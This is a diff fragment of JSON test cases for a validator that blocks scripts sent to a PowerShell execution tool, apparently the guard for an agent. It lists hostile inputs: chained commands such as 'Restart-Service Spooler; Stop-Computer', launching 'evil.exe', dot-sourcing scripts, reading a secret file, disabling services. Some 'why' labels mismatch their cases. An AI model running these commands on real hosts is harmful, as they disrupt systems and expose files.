+      "expect": "blocked",
+      "why": "wildcard restarts every service"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Restart-Service -Name 'Win*'"
+      },
+      "expect": "blocked",
+      "why": "wildcard in quotes"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Restart-Service Spooler; Stop-Computer"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Invoke-Expression 'Get-Service'"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "& 'C:\\evil.exe'"
+      },
+      "expect": "blocked",
+      "why": "call operator"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": ". C:\\evil.ps1"
+      },
+      "expect": "blocked",
+      "why": "dot-source"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "sc query wuauserv"
+      },
+      "expect": "blocked",
+      "why": "bare sc is Set-Content in PowerShell"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "sc.exe stop wuauserv"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "sc.exe config wuauserv start= disabled"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "ipconfig /release"
+      },
+      "expect": "blocked",
+      "why": "drops the host off the network"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "netstat -ano 5"
+      },
+      "expect": "blocked",
+      "why": "interval runs forever"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "ping -t 8.8.8.8"
+      },
+      "expect": "blocked",
+      "why": "runs forever"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Select-String -Path C:\\secret.txt x"
+      },
+      "expect": "blocked",
+      "why": "Select-String -Path reads files"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service | Select-String x C:\\secret.txt"
+      },
+      "expect": "blocked",
+      "why": "second positional is a path"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service -Name:$true"
+      },
+      "expect": "blocked",
+      "why": "variable"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-WinEvent -FilterHashtable @{LogName=(Stop-Computer)}"
+      },
+      "expect": "blocked",
+      "why": "expression in a hashtable"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-WinEvent -FilterHashtable @{LogName=$x}"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service -Name [char]65"
+      },
+      "expect": "blocked",
+      "why": "type literal"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": "Get-Service # comment"
+      },
+      "expect": "blocked",
+      "why": "everyday diagnostic"
+    },
+    {
+      "tool": "powershell_exec",
+      "args": {
+        "script": ""
+      },
+      "expect": "blocked",
+      "why": "empty"
+    }
+  ]
+}
